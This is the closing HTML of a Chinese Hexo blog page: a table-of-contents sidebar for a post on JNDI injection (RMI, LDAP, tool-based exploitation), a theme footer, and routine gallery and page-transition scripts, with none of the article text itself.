href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJNDI"><span class="toc-number">2.</span> <span class="toc-text">什么是JNDI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D-gt-Naming-Service"><span class="toc-number">3.</span> <span class="toc-text">命名 &#x3D;&gt; Naming Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95-gt-Directory-Service"><span class="toc-number">4.</span> <span class="toc-text">目录 &#x3D;&gt; Directory Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%9C%80%E8%A6%81%E7%9A%84%E7%B1%BB"><span class="toc-number">5.</span> <span class="toc-text">一些需要的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-Reference-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">JNDI Reference 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-RMI"><span class="toc-number">7.</span> <span class="toc-text">JNDI-RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI-LDAP"><span class="toc-number">8.</span> <span class="toc-text">JNDI_LDAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">工具化利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">10.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>